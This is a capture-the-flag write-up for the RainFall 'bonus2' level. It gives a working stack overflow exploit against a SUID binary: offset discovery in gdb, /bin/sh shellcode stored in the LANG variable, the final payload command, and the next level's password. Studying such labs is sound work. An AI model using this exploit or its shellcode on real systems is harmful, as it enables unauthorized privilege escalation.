# Level bonus 2

## Vulnerability

strcat() heap overflow, return-to-libc

## Context

We find a binary with owner ```bonus3``` and SUID.
```
bonus2@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
```
When run with 0 or 1 arguments, it does nothing. Run with 2 arguments it prints "Hello " + first argument.
```
bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 wait
bonus2@RainFall:~$ ./bonus2 wait what?
Hello wait
```

## Solution

In summary, the program expects to be given a username, then prints "Hello <username>".

Investigating with gdb we find ```main()``` initializes a 72 byte buffer, copies 40 bytes from argv[1], then 32 bytes from argv[2]. It then checks the language env variable, setting global variable ```lang```: English (default) = 0, Finnish = 1, Dutch = 2.

```main``` then calls function ```greetuser()``` which copies "Hello " (in the appropriate language) into a 64 byte buffer, then concatenates the given username string. Finally ```puts``` prints the buffer "Hello <username>".

It looks like when using ```strcat()``` to concaternate the 72 byte ```main()``` buffer to the 64 byte ```greetuser()``` buffer, it could overflow. Lets try to break it.
```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
```

### Find EIP offset

Great, lets see if we can overwrite the EIP. Using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find our overflow does not reach the EIP.
```
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
```
Perhaps if we change language, so have a longer greeting message, our overflow will reach the EIP. In Finnish we find our EIP offset is 18.
```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ env | grep "LANG"
LANG=fi
bonus2@RainFall:~$ gdb -q bonus2
...
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```
In Dutch we find our EIP offset is 23.
```
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ gdb -q bonus2
...
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
```

### Store exploit in env

Next: overwrite EIP with what address? Where we should store our malicious code? We export our malicious code into the ```env``` following the ```export LANG=fi``` (Let's be Finnish!).

First a NOP slide ```'\x90' * 100```, then our [malicious shell code which calls system, opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php) same as previous levels. ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```. 

Putting that together:
```
bonus2@RainFall:~$ export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

### Find exploit address

Find the address of NOP slide in the env language variable with gdb. Create a break point at getenv("LANG"), run and examine the memory.
```
bonus2@RainFall:~$ gdb -q bonus2
...
(gdb) break *main+125
...
(gdb) run first_name second_name
...
(gdb) x/19s *((char**)environ)
...
0xbffffe79:	 "LANG=fi\220\220...
```
We find our exploit stored after the language var starting at ```0xbffffe79```. We need to add to this address to land somewhere on our NOP slide, lets add 42 giving us the target address ```0xbffffea3```.

### Build overflow string

So, we build our first argument:
1. 40 bytes padding - ```$(python -c 'print "A" * 40')```

And our second argument:
1. 18 bytes padding (23 if Dutch) - ```$(python -c 'print "B" * 18')```
2. address on NOP slide in env language variable - ```\xa3\xfe\xff\xbf```

```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xa3\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
